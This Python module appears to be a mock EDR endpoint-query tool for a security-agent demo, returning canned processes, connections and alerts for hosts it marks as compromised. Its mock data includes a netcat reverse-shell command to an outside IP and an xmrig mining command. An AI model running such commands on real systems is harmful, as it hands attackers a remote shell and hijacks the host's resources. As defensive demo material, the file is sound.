"""EDR endpoint query tool.

Mocks a CrowdStrike/SentinelOne-style EDR lookup: running processes, recent
network connections, IOCs (file hashes), lateral movement signals.
Returns scenario-aware mock data keyed on hostname so demos are deterministic.
"""
from __future__ import annotations

import hashlib
import random
from datetime import datetime, timedelta, timezone

from app.config import settings
from app.tools.registry import tool


def _seed(hostname: str) -> int:
    return int(hashlib.md5(hostname.lower().encode()).hexdigest(), 16)


@tool(
    name="query_edr_endpoint",
    description=(
        "Query the EDR for endpoint telemetry on a host: running processes, recent "
        "network connections, IOC hits (file hashes). Use this on every affected host "
        "to assess compromise state."
    ),
    parameters={
        "type": "object",
        "properties": {
            "hostname": {"type": "string", "description": "hostname or FQDN"},
            "hours_back": {"type": "integer", "default": 1},
            "include_alerts": {"type": "boolean", "default": True},
        },
        "required": ["hostname"],
    },
)
async def query_edr_endpoint(hostname: str, hours_back: int = 1, include_alerts: bool = True) -> dict:
    if settings.use_mock_tools:
        return _mock(hostname, hours_back, include_alerts)
    # Real path stub — production would call CrowdStrike Falcon API here.
    return _mock(hostname, hours_back, include_alerts)


def _mock(hostname: str, hours_back: int, include_alerts: bool) -> dict:
    seed = _seed(hostname)
    rng = random.Random(seed)
    now = datetime.now(timezone.utc)
    is_compromised = (
        "bastion" not in hostname.lower() and seed % 3 == 0
    ) or any(
        t in hostname.lower() for t in ("prod-app-03", "k8s-worker-7", "prod-db-02")
    )

    processes: list[dict] = [
        {"pid": 1, "name": "systemd", "user": "root"},
        {"pid": 412, "name": "sshd", "user": "root"},
    ]
    connections: list[dict] = []

    if is_compromised:
        processes += [
            {"pid": 4888, "name": "xmrig", "user": "nobody", "command_line": "./xmrig --url pool.minexmr.com:4444", "suspicious": True},
            {"pid": 5102, "name": "nc", "user": "nobody", "command_line": "nc -e /bin/bash 45.142.120.99 9001", "suspicious": True},
        ]
        for _ in range(4):
            connections.append(
                {
                    "timestamp": (now - timedelta(minutes=rng.randint(0, hours_back * 60))).isoformat(),
                    "local_port": rng.randint(40000, 60000),
                    "remote_ip": rng.choice(["45.142.120.99", "193.32.162.144", "203.0.113.42"]),
                    "remote_port": rng.choice([4444, 9001, 8080]),
                    "process": rng.choice(["xmrig", "nc", "sshd"]),
                    "verdict": "MALICIOUS",
                }
            )

    alerts = []
    if include_alerts and is_compromised:
        alerts = [
            {
                "alert_id": f"EDR-ALERT-{seed % 99999}",
                "title": "Suspicious process spawn: xmrig",
                "severity": "HIGH",
                "timestamp": (now - timedelta(minutes=rng.randint(0, hours_back * 60))).isoformat(),
                "file_hash": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
            },
            {
                "alert_id": f"EDR-ALERT-{(seed >> 3) % 99999}",
                "title": "Reverse shell to known malicious IP",
                "severity": "CRITICAL",
                "timestamp": (now - timedelta(minutes=rng.randint(0, hours_back * 60))).isoformat(),
                "file_hash": "2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ef",
            },
        ]

    return {
        "hostname": hostname,
        "compromised": is_compromised,
        "os": rng.choice(["Linux Ubuntu 22.04", "Windows Server 2019", "RHEL 9"]),
        "agent_version": "EDR-Agent 7.2.0",
        "last_seen": now.isoformat(),
        "processes": processes,
        "network_connections": connections,
        "alerts": alerts,
        "ioc_count": len(alerts),
    }